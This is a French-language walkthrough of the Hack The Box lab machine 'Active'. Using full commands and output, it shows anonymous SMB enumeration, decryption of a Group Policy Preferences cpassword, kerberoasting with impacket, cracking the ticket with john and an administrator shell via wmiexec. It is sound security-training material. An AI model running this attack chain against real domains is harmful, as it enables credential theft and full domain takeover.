## The active Box 
Ce Box appartient au tracks de Active Directory 101 pour me permettre d'elargir mes competences en AD hacking

### Recon
Je commence avec un basic scan 
```
└─# nmap 10.129.9.50                             
Host is up (0.40s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```
Mon second scan qui indexera toutes les ports ouverts dans le `-sC` pour avoir plus d'infos possibles
```
nmap -sV -sC -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,49153-49158 $ip
Host is up (0.47s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-22 14:32:28Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49156/tcp closed unknown
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-22T14:33:30
|_  start_date: 2024-02-22T14:24:47
```
## Analysis
Avec le port `88` je vois que c'est le kerberoas, alors je me dit que j'ai 90% la certitude que je suis dans un Active Directory.
Le port `139` et `445` sont ouvert qui me donne une multutide d'idee d'attaque sur le smb
Ainsi le port `389` et `636` qui m'index le `LDAP`
Aussi en dernier je trouve le domain `active.htb` et le domain controller `DC.active.htb` ainsi que le system en question `windows_server_2008`

## Continue
Avec cet analyse je vais debuter mon pentest sur le smb en essayant de faire quelque enumeration de share
```
──(root㉿hacker101)-[/home/bloman/Github/RED-TEAM/Win_Boxes]
└─# smbmap -H 10.129.9.50

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.9.50:445 Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
                                                                                          

```
Pour commencer j'ai utiliser l'outil `smbmap -H $ip` pour lister des shares accessibles en anonyme. ceci me dit que j'ai le droit de lire le partage de `Replication`. Donc avec ca je peux utiliser `smbclient` pour lire ca.
- Je pourrais aussi utiliser `crackmapexec`
```
└─# crackmapexec smb 10.129.9.50 -u '' -p ''
SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.50     445    DC               [+] active.htb\: 
```
qui confirme que l'access anonyme est available
```
└─# crackmapexec smb 10.129.9.50 -u '' -p '' --shares
SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.50     445    DC               [+] active.htb\: 
SMB         10.129.9.50     445    DC               [+] Enumerated shares
SMB         10.129.9.50     445    DC               Share           Permissions     Remark
SMB         10.129.9.50     445    DC               -----           -----------     ------
SMB         10.129.9.50     445    DC               ADMIN$                          Remote Admin
SMB         10.129.9.50     445    DC               C$                              Default share
SMB         10.129.9.50     445    DC               IPC$                            Remote IPC
SMB         10.129.9.50     445    DC               NETLOGON                        Logon server share 
SMB         10.129.9.50     445    DC               Replication     READ            
SMB         10.129.9.50     445    DC               SYSVOL                          Logon server share 
SMB         10.129.9.50     445    DC               Users           
```
Maintenant je vais utiliser `smbclient` pour acceder au fichier auxquels j'ai droit
```
└─# smbclient -N \\\\10.129.9.50/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 10:37:44 2018
  ..                                  D        0  Sat Jul 21 10:37:44 2018
  active.htb                          D        0  Sat Jul 21 10:37:44 2018

                5217023 blocks of size 4096. 284724 blocks available
smb: \> 
```
J'ai access anonyme so, j'ai vue un dossier a l'interieur je vais essayer de la download
```
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.9 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.8 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.6 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (4.0 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \> 
```
Je vais faire un `tree` pour voir les `fichiers` qui sont a l'interieur
```
└─# tree                   
.
└── active.htb
    ├── DfsrPrivate
    │   ├── ConflictAndDeleted
    │   ├── Deleted
    │   └── Installing
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── Group Policy
    │   │   │   └── GPE.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts
```
## Analysis
Dans ce dossier `tree` le fichier qui prend mon attention c'est le `Groups.xml`
Souvent c'est un fichier qui contient le `Group Policy Password Preferences`. Les préférences de stratégie de groupe sont une collection d'extensions de stratégie de groupe côté client qui fournissent des paramètres de préférence aux ordinateurs reliés à un domaine et fonctionnant sous les systèmes d'exploitation de bureau et de serveur Microsoft Windows.
-  https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a

Lisons ce fichier
```
└─# cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
Dans ce fichier je vois un `cpassword` qui est crypter. Au faite Pour la protection, Microsoft crypte le mot de passe à l'aide d'AES avant qu'il ne soit stocké en tant que `cpassword`. Mais les clés sont disponibles publiquement sur MSDN !

## Decryptage 
On specifie que les cle de dechiffrement sont souvent disponible publiquement.
- Tous les mots de passe sont cryptés à l'aide d'une clé AES (Advanced Encryption Standard).
La clé AES de 32 octets est la suivante :
```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```
On peux utiliser un outil pour le decrypter qui se nomme `gpp-decrypt`
```
└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```
Voici le mot de passe encoder, Ok dans cette meme `Groups.xml` on vois une ligne `userName="active.htb\SVC_TGS"` qui specifie l'utilisateur a qui appartient cet mot de passe.

## Analysis
Maintenant on a un utilisateur et un mot de passe, so que peut-on faire ?
D'abord je vais voir si `winrm` est ouvert dans le port `5985` 
```
─# nc -nv $ip 5985
(UNKNOWN) [10.129.9.50] 5985 (?) : Connection refused
```
C'est pas ouvert,  donc la seconde option c'est de voir si cet user existe dans le smb avec `crackmapexec`
```
┌──(root㉿hacker101)-[/home/…/CTFs/Boot2root/HacktheBox/VIP]
└─# crackmapexec smb 10.129.9.50 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.50     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```
On a une confirmation que cet user existe bien.  Donc quoi faire ?
Je vais d'abord enumerer les shares que cet user peux `READ`, ensuite de faire un `rid-brute` pour avoir tout les users
```
└─# crackmapexec smb 10.129.9.50 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.50     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.9.50     445    DC               [+] Enumerated shares
SMB         10.129.9.50     445    DC               Share           Permissions     Remark
SMB         10.129.9.50     445    DC               -----           -----------     ------
SMB         10.129.9.50     445    DC               ADMIN$                          Remote Admin
SMB         10.129.9.50     445    DC               C$                              Default share
SMB         10.129.9.50     445    DC               IPC$                            Remote IPC
SMB         10.129.9.50     445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.9.50     445    DC               Replication     READ            
SMB         10.129.9.50     445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.9.50     445    DC               Users           READ            
```
Avec ceci je vais aller au dossier users

```
└─# smbclient \\\\10.129.9.50/Users -U SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 14:39:20 2018
  ..                                 DR        0  Sat Jul 21 14:39:20 2018
  Administrator                       D        0  Mon Jul 16 10:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 05:06:44 2009
  Default                           DHR        0  Tue Jul 14 06:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 05:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 04:57:55 2009
  Public                             DR        0  Tue Jul 14 04:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 15:16:32 2018
```
`user -- db75cc8218b74eb6ec957fc6d22bbe3c`

## Escalation
Bon ici on a eu le flag de user, donc le dernier a faire c'est de rooter la box et de devenir Domain admin
La chose que je vais essayer de faire c'est d'enumerer les utilisateurs,  ensuite avec ces utilisateurs je vais essayer de faire l'attaque de kerberoasting, pour trouver des utiliser qui ont un access `Pre-authentification`
```                                                                        
└─# crackmapexec smb 10.129.9.50 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000
SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.50     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.9.50     445    DC               [+] Brute forcing RIDs
SMB         10.129.9.50     445    DC               498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.9.50     445    DC               500: ACTIVE\Administrator (SidTypeUser)
SMB         10.129.9.50     445    DC               501: ACTIVE\Guest (SidTypeUser)
SMB         10.129.9.50     445    DC               502: ACTIVE\krbtgt (SidTypeUser)
SMB         10.129.9.50     445    DC               512: ACTIVE\Domain Admins (SidTypeGroup)
SMB         10.129.9.50     445    DC               513: ACTIVE\Domain Users (SidTypeGroup)
SMB         10.129.9.50     445    DC               514: ACTIVE\Domain Guests (SidTypeGroup)
SMB         10.129.9.50     445    DC               515: ACTIVE\Domain Computers (SidTypeGroup)
SMB         10.129.9.50     445    DC               516: ACTIVE\Domain Controllers (SidTypeGroup)
SMB         10.129.9.50     445    DC               517: ACTIVE\Cert Publishers (SidTypeAlias)
SMB         10.129.9.50     445    DC               518: ACTIVE\Schema Admins (SidTypeGroup)
SMB         10.129.9.50     445    DC               519: ACTIVE\Enterprise Admins (SidTypeGroup)
SMB         10.129.9.50     445    DC               520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.9.50     445    DC               521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.9.50     445    DC               553: ACTIVE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.9.50     445    DC               571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.9.50     445    DC               572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.9.50     445    DC               1000: ACTIVE\DC$ (SidTypeUser)
SMB         10.129.9.50     445    DC               1101: ACTIVE\DnsAdmins (SidTypeAlias)
SMB         10.129.9.50     445    DC               1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.9.50     445    DC               1103: ACTIVE\SVC_TGS (SidTypeUser)
```
Bon ici j'ai deja toutes les `users`. 
Aussi le port `135 ` est ouvert, On peux aussi avoir toutes les `users`
```
└─# rpcclient -U "SVC_TGS" 10.129.9.50 
Password for [WORKGROUP\SVC_TGS]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient $> 
```

- **Kerberoasting**
Le Kerberoasting est une méthode d'attaque qui tente d'obtenir des mots de passe en clair à partir de tickets Kerberos de comptes de service. L'une des façons d'attribuer des comptes de service consiste à utiliser un attribut appelé nom de principal de service (SPN), qui relie un service à un compte d'utilisateur.
Pour ce faire, je vais utiliser le `GetUsersSPNs` de impacket pour cet attaque.
Mais d'abord je vais verifier avec `kerbrute` si c'est `users` on deja un compte `kerberoas` avec l'outil `kerbrute`

```
└─# kerbrute userenum --dc 10.129.9.50 -d active.htb users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/22/24 - Ronnie Flathers @ropnop

2024/02/22 15:26:54 >  Using KDC(s):
2024/02/22 15:26:54 >   10.129.9.50:88

2024/02/22 15:26:54 >  [+] VALID USERNAME:       SVC_TGS@active.htb
2024/02/22 15:26:54 >  [+] VALID USERNAME:       Administrator@active.htb
```
Comme le confirme `kerbrute` on a que 2 users qui ont ces compte, donc je vais enlever les autres et continuer avec `GetUsersSPNs`,  mais jai deja access au `SVC_TGS`,  donc ca me reste qu'un seul utilisateur qui est le `Administrator`
```
└─# impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -usersfile users.txt 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$Administrator*$0e681bad7613234f88f0e1e614a8f79e$4f3ef9e39b081143e47d83ddbecb75cd0a0091b22d991dbd3a96fbf0f97a2e70f49580e3cd76eac94c5ef8587929c1a6b6438f7380f3fc1be3ff5d09cdaabe074ed486399dfddc4bc6cdfd1ee4368bc748f2625d742fe7fc110ed2ba1dbf7db74c157a9c0df7c350553d0582f32c0d1c5cd9e02825b2daa65cff7e405457f45bc04d68cebb616dabd5207537ec4e5b655f09c20c5817c057b626ed1b7d6cea7b06e21365e62f9c60cd28d481ddcdc7a4f766f0ccecabfbe633e2e34b5c8a2a1d2233064ab5491f8ddb85967f5be0237db58549e9c283707a09b694c7f3d2e003dd1e5986d6afcff039919647cf9d0151016e0e9ef02ab4dd4b14b4bfbf15c4f4664f1ef554a82883ca431a8a90af3450e457e8af0eaae65147ff46d532c8e215802dc7990767f154d495c046a0375947ae49302a53fcb9dac8c04bb738677640810dacff06575974b126e4532cec074cb0ec7b6b024e4a7bb47d0ce5ab31a5bb1c876ae63781b35695aa92233779f718fd5f8fd99a3b0138d10916be62e3d9eeb93001f8d98d0385b3b884f3fbb92331805b95ecc0b8b2c7db24d8792ad75121485b1f229f685b349d30fa3becbbc1da4fcb81b551a309d8d93d32092797d3211f0da30533a38a6c19803757b1459045f20d107c1cdcb1bff21ae487225b7e9178617e20ad33479f799d1c5769ffeb2b37867b1fb5902472c21a35c395adf00d80396e0dc5da0ac468f7554fc30e6a155001a680e7945c2ce0f2a6315a3f144f7959a0d979acb185ee7d8bca0ece5076f95bb3664b21327fb5bd18da3eea9330a9ca6f5482191457af6e6205f1c3f84f6bd2aedf10250ac2ff31b32fbcd11875bd9516f2acdecbe80d1f762f555b2e47c83924ba7d7946f4edc9df9ba71fecf0dc153c585f6638007d0c43a81fde64a1f53313810c6fbbc487075ba75b2473bb9e80810f658f776aaaff9e47622e5408729b533f528a8b6142a72ddace48c184ef3a44a680b73689e78561d6ca107ead7243a35d12304495909c932b91c752f21385963855084e0319d3e9c9ed9f8849784ba2633f85d600e12457216a2fa30a52cb0751ec67eebf44965269aca35e0126bd9ae01e34f1460702cdc5783a463c8a0649d6211a984e23f4bc577e98b9aecbed348283c1bfa520fc17c406bdeb0104142c80ffcf7bc10f4b611e12cecff1012793ce23cfd995b7a8f34c96cc719cc212475154b8e3c5c1de82699715cce099a0a787ddaaf19db735

```
Avec success on obtient le TGT de l'admin, maintenant il ne reste qu'a le cracker avec `john` ou `hashcat`
```
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:10 DONE (2024-02-22 15:32) 0.09891g/s 1042Kp/s 1042Kc/s 1042KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
On a encore un autre utilisateur et un mot de passe, mais quoi faire ?
## Analysis
retournons au basic et essayons d'abord `crackmapexec`
```
└─# crackmapexec smb 10.129.9.50 -u Administrator -p 'Ticketmaster1968'                
SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.50     445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```
On a un `(Pwn3d!)` qui veux dire qu'on a un control total sur cette Box maintenant.
Let's dump. dumpons les hash et essayons l'attaque de `Pass-The-hash`
```
└─# crackmapexec smb 10.129.9.50 -u Administrator -p 'Ticketmaster1968' --ntds 

```
Oubien utiliser ce password pour me connecter avec `wmiexec` de impacket
```
└─# impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.129.9.50
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Directory of C:\

14/07/2009  05:20 ��    <DIR>          PerfLogs
12/01/2022  03:11 ��    <DIR>          Program Files
21/01/2021  06:49 ��    <DIR>          Program Files (x86)
21/07/2018  04:39 ��    <DIR>          Users
22/02/2024  05:39 ��    <DIR>          Windows
               0 File(s)              0 bytes
 Directory of C:\Users\administrator\Desktop

21/01/2021  06:49 ��    <DIR>          .
21/01/2021  06:49 ��    <DIR>          ..
22/02/2024  04:25 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.126.309.888 bytes free

C:\Users\administrator\Desktop>type root.txt
10d64997a058c15378561f81c2aa6b42

C:\Users\administrator\Desktop>
C:\Users\administrator\Desktop>systeminfo
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec

Host Name:                 DC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84027
Original Install Date:     16/7/2018, 1:13:22 ��
System Boot Time:          22/2/2024, 4:24:27 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.412 MB
Virtual Memory: Max Size:  11.092 MB

```


## Lesson Learned
